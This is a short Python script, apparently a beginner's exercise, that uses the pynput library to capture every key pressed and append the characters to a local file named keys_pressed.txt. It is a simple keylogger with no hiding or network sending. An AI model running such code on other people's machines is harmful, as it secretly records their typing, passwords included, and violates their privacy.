from pynput import keyboard 

def key_press(key):
    with open("keys_pressed.txt", 'a') as log:
        try:
            char = key.char
            log.write(char)
        except:
            print("Couldn't get key")
        

if __name__ == "__main__":
    listen = keyboard.Listener(on_press=key_press)
    listen.start()
    input()

    